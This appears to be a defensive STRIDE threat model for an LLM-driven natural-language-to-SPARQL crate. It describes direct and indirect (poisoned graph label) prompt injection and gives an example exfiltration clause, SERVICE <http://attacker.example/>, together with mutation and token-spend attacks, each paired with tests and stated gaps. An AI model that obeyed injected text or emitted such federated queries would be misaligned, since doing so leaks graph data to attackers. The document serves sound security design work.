<!-- [SONNET-4.6] Threat model for the sparq-nlq NL→SPARQL loop. Bead sq-j1wv, un-deferred
     by the GPT-5.6 strategy review; parent of the STABLE-core model at
     research/threat-model.md, which previously listed this crate as deferred. -->
# Threat model — `sparq-nlq` (NL→SPARQL)

A STRIDE-style model for the one crate in the workspace that hands **untrusted text to
a language model and then executes what comes back**. Companion to
[`research/threat-model.md`](threat-model.md) (the STABLE core), which deferred this
crate under bead **sq-j1wv**; that deferral is now lifted and the row points here.

Evidence-based, not aspirational: a mitigation is cited by the test that actually
verifies it, and a gap is stated plainly. Do not read a cited mitigation as more than
what its test proves.

## Scope and posture

`sparq-nlq` is an **opt-in crate** (nothing in the workspace depends on it; the default
build does not compile it) whose network backends — `live` (Anthropic Messages API) and
`nlq-endpoint` (a user-supplied OpenAI-compatible endpoint) — are **both off by
default**. It is not reachable from the shipped `sparq-server`. The model below applies
to an embedder who compiles it in and points it at a graph.

**The honest headline.** No transform over prompt text can *prevent* an
instruction-following model from being talked into writing a different query, and this
crate does not claim to. The posture is to make the **consequences** bounded: whatever
the model writes is parsed to algebra and inspected before the engine sees it. Text
sanitization is the cheap outer layer; the algebra gate and the query budget are the
layer that carries the weight.

## Assets

1. **Dataset confidentiality** — the graph's contents not leaving the process to a
   party that should not see them. The sharpest asset here, because the loop can be
   made to emit a query that *ships data outbound*.
2. **Dataset integrity** — the loop never mutating the store it was asked to read.
3. **Answer integrity** — the returned answer being an answer to the *asked* question,
   not to an injected one.
4. **Host availability / cost** — bounded CPU, memory, and (uniquely for this crate)
   bounded **token spend**: the LLM call is a metered external resource, so an
   unbounded prompt is a billing DoS, not only a latency one.

## Trust boundaries

```text
 untrusted QUESTION ─────┐
 (whoever is asking)     │
                         ▼
 untrusted GRAPH TEXT ─▶┌──────────────────────────────────┐
 (schema-summary        │ (N1) prompt construction          │
  samples, entity       │  prompt_for / repair_prompt_for   │
  labels — whoever      └──────────────────────────────────┘
  wrote the triple)                 │ prompt
                                    ▼
                        ┌──────────────────────────────────┐
                        │ (N2) the model  (Llm::complete)   │──▶ external API (live /
                        └──────────────────────────────────┘     nlq-endpoint only)
                                    │ completion (UNTRUSTED)
                                    ▼
                        ┌──────────────────────────────────┐
                        │ (N3) extract → spargebra parse →  │
                        │      guard → execute under budget │
                        └──────────────────────────────────┘
                                    │ failure text re-enters N1
                                    └──────────────▲ (the repair loop closes the cycle)
```

- **N1 — untrusted text → prompt.** Three sources: the question (*direct* injection),
  graph-derived text (*indirect / data* injection — the schema summary renders sampled
  values, and the entity linker renders label literals), and, on a repair round, the
  model's own previous output.
- **N2 — prompt → model.** Off-box when a network backend is compiled in. The prompt
  carries whatever the graph and the asker put in it, so *what is sent* is itself a
  confidentiality decision.
- **N3 — completion → engine.** The completion is untrusted input to the SPARQL parser
  and then to the executor. This is where the consequences are bounded.

## Threats

### T-NLQ-INJECT-DIRECT — Tampering (prompt injection via the question)

*Mechanism:* `Nlq::prompt_for` splices the question into the prompt template, which is
line-structured (`Question:` lines) and fence-structured (` ```sparql ` blocks). A
question carrying newlines and fences can forge an extra few-shot example or close the
instruction block, and — regardless of structure — can simply *ask* the model to ignore
the preceding rules.

*Mitigation (implemented, sq-j1wv):* the question is passed through
`guard::flatten_untrusted` (`crates/sparq-nlq/src/guard.rs`) before it is spliced:
backtick runs of 3+ become apostrophes, and every control character / line separator
folds to a space, so the text stays on the one line the template gave it.
*Verified by* `tests/injection.rs::injected_question_cannot_forge_a_fence_or_a_prompt_line`,
which compares the hostile prompt's fence and `Question:`-line counts against a benign
baseline (self-calibrating, so it cannot rot into a hard-coded number).

*Residual — stated plainly:* this stops the **structural** trick only. A question that
politely asks the model to write a different query is unaffected, and nothing here
detects that. The containment for a *successful* persuasion is T-NLQ-EXFIL and
T-NLQ-MUTATE below, which is the point of the two-layer design.

### T-NLQ-INJECT-DATA — Tampering (indirect injection via graph content)

*Mechanism:* the prompt's grounding is **derived from the data**. Two paths:
`sparq_introspect::Introspection::to_text_summary` renders sampled values into the
schema card (`, e.g. <value>`), and `link::Linking::to_prompt_section` renders matched
**label literals** verbatim. Whoever can write a triple into the graph can therefore
write text into the prompt of every subsequent question — the classic second-order
injection, and the one that matters most for a triplestore that ingests third-party
RDF.

*Mitigation (implemented, sq-j1wv):* the linker's mentions and labels go through
`guard::flatten_untrusted` (one prompt line, no fence), and the whole schema summary
goes through `guard::sanitize_block` at `Nlq::with_config` (fences neutralized,
control characters other than `\n` folded — the deck's line structure is load-bearing,
so newlines are kept). *Verified by*
`tests/injection.rs::poisoned_label_cannot_forge_a_line_in_the_linking_section`, which
poisons an `rdfs:label` with newlines, a fence, and a forged `Question:` line and
asserts the prompt's structure is unchanged.

*GAP — residual, honest:* `sanitize_block` keeps newlines, so a *sampled value*
containing a raw newline can still forge a line **inside the schema card**. Fixing that
properly means escaping the value where it is rendered, which is
`sparq-introspect`'s job, not this crate's — the summary arrives here as one opaque
string. Tracked as follow-up work against `sparq-introspect`.

### T-NLQ-EXFIL — Information disclosure (data exfiltration via a generated `SERVICE`)

*Mechanism:* the sharpest consequence of a *successful* injection. A generated query
containing `SERVICE <http://attacker.example/>` makes the engine POST locally-bound
data to an attacker-chosen endpoint — exfiltration, and SSRF into the host's internal
network (the same primitive as T-SERVICE-SSRF in the core model). The prompt *asks* the
model not to federate; before sq-j1wv nothing *enforced* it.

*Mitigation (implemented, sq-j1wv):* `guard::forbidden_constructs` walks the parsed
algebra and refuses any `SERVICE` clause unless `GuardConfig::allow_federation` is
explicitly set. Refusal happens **before execution** and becomes a targeted repair
signal (`TurnOutcome::Forbidden`), so the loop can recover rather than merely fail. The
decision is made on typed parser output — like `policy::classify_query` — so it cannot
be fooled by a `SERVICE` hidden in a comment, a string literal, or a prefixed name.
*Verified by* `guard::tests::federation_is_found_however_deeply_it_is_nested` (12
nestings: `OPTIONAL`, `UNION`, `MINUS`, `FILTER (NOT) EXISTS`, `GRAPH`, `ORDER BY`
expression, aggregate argument, `BIND`, and all four query forms — an undescended match
arm reports nothing and fails the test),
`guard::tests::ordinary_local_queries_are_not_forbidden` (no false positives), and
end-to-end by `tests/injection.rs::generated_federation_is_refused_and_never_executed`
and `::federation_fails_closed_and_opting_in_is_explicit`.

*Defence in depth, credited honestly:* `sparq-nlq` pulls `sparq-engine` with default
features, and `SERVICE` execution is behind the engine's non-default `service` feature —
so today an unguarded `SERVICE` would also fail at the engine. The guard makes the
denial **explicit, independent of how the engine was built, and cheap** (no execution
attempt), rather than an accident of feature selection.

### T-NLQ-MUTATE — Tampering (injected `INSERT` / `DELETE` / `DROP` / `LOAD`)

*Mechanism:* an injection whose goal is to wipe or poison the dataset, or to make the
engine fetch a remote document (`LOAD`).

*Existing mitigation — structural, and stronger than a filter:* the loop parses with
`spargebra::SparqlParser::parse_query`, which yields a `spargebra::Query`. Every SPARQL
result form is read-only (`policy::classify_query`), and an update request does not
parse as a query **at all** — it is a syntax error, so mutation is unreachable rather
than merely blocked. *Verified by*
`guard::tests::mutating_requests_never_parse_as_queries` and, end-to-end through the
loop (including a store-unchanged assertion), by
`tests/injection.rs::a_mutating_completion_can_only_ever_be_a_parse_error`.

### T-NLQ-BUDGET — Denial of service (token spend, prompt growth, execution cost)

*Mechanism:* three distinct budgets, one of which is unique to this crate:

1. **Token spend.** The question is spliced into the prompt verbatim; an oversized
   question is a *billing* attack against a metered API, paid before anything can go
   wrong downstream.
2. **Prompt growth across the repair loop.** `repair_prompt_for` stacks the model's own
   failed query and the error text onto the full grounding prompt, so a model that
   answers with a very large blob inflates every later round.
3. **Execution cost.** The generated query itself.

*Mitigations:* (1) `guard::check_question` rejects a question over
`GuardConfig::max_question_chars` (default 4096) **before the prompt is built and
before any LLM call** — *verified by*
`tests/injection.rs::oversized_question_is_refused_without_spending_an_llm_call`, which
counts backend calls and asserts zero. (2) both echoed strings are capped at
`max_echo_chars` (default 8192) with an explicit `[truncated N characters]` marker,
never a silent cut — *verified by* `::repair_echo_is_bounded_and_marked`.
(3) pre-existing and unchanged: `NlqConfig::max_repair_rounds` bounds the number of
calls, and every execution runs under a `QueryBudget` that is **bounded by default**
(10 s, 1M rows), tested by `budget_trips_surface_as_exec_errors`.

*GAP — residual:* the *grounding* half of the prompt (schema summary + linking section)
is bounded by `summary_budget_chars` / `max_links`, but there is no single cap on the
**assembled prompt**, and no cap on the size of a *completion* the backend returns
(`live::AnthropicLlm` bounds its own `max_tokens` at 2048; a user-supplied
`nlq-endpoint` backend is bounded by whatever that server does). Low severity — the
components are individually bounded — but it is not a proven total.

### T-NLQ-EGRESS — Information disclosure (the prompt itself leaves the process)

*Mechanism:* with `live` or `nlq-endpoint` compiled in, the grounding prompt — which
contains a **schema card and sampled values from the graph** — is sent to a third-party
API. That is the feature working as designed, but it is a confidentiality decision an
embedder must make knowingly: pointing the loop at a private graph discloses part of
that graph to the model provider.

*Existing mitigation:* both backends are **off by default** and neither bakes in an
endpoint (`nlq-endpoint` is entirely user-supplied); CI never calls a network. The
default path is `ReplayLlm`, fully offline.

*GAP:* not a code gap — a **documentation** one, addressed by this section and the
crate README. There is no redaction/allowlist of what the schema card may disclose;
an embedder who needs that must bound `summary_budget_chars` or ground against a
sanitized graph. Worth a bead if a private-graph deployment materializes.

### T-NLQ-TRUST — Elevation of privilege (the loop's authority)

*Mechanism:* the loop executes with whatever authority its caller holds — it has no
identity of its own and performs no authorization. An embedder that runs `ask` on
behalf of end users must not assume the guard is an authorization layer.

*Existing mitigation:* read-only by construction (T-NLQ-MUTATE) and no outbound
federation (T-NLQ-EXFIL), so the authority is bounded to *reading the graph it was
handed*. Per-user authorization is `sparq-solid`'s job; scoping the graph is the
embedder's.

## Residual risks

| # | Residual risk | Severity | Boundary | Disposition |
|---|---|---|---|---|
| 1 | Persuasive natural-language injection still redirects *what question gets answered* (answer integrity) | **Medium**, structural | N1/N2 | Not fixable by text transforms; contained on consequences (T-NLQ-EXFIL / T-NLQ-MUTATE), never on intent. Stated, not papered over. |
| 2 | A sampled value containing a newline can forge a line inside the schema card | **Low** | N1 | Needs escaping at the render site in `sparq-introspect`; out of this crate's reach (the summary arrives as one string). Follow-up. |
| 3 | No cap on the assembled prompt or on completion size | **Low** | N1/N2 | Components individually bounded (`summary_budget_chars`, `max_links`, `max_question_chars`, `max_echo_chars`, `max_repair_rounds`). |
| 4 | Prompt contents (schema card + sampled values) leave the process on a live backend | **Medium**, by design | N2 | Both backends default-off; documented here and in the README. No redaction layer. |
| 5 | Guard is not an authorization layer | **Medium**, by design | N3 | Bounded authority (read-only, no federation); per-user authz is `sparq-solid`. |

## Posture summary (non-sycophantic)

- **Mutation is genuinely unreachable**, not filtered: it fails at the parser. That is
  the strongest claim in this document, and it is tested end-to-end.
- **Federation is now refused explicitly** rather than by accident of which engine
  features happened to be compiled, and the walk is tested against 12 nestings, so it
  is not the usual top-level-only check.
- **Injection itself is not solved and is not claimed to be.** The input-side transforms
  stop structural forgery and nothing more. Anyone reading "hardened against prompt
  injection" as "immune" has read it wrong; the design bet is that bounding the
  *consequences* is the achievable half.
- The **budget** story is good on the paths that are metered (question, echo, rounds,
  execution) and unproven as a *total* (no assembled-prompt cap).
- The **egress** story is the one an embedder is most likely to get wrong: the default
  is safe (offline replay), and the sharp edge is one cargo feature away.
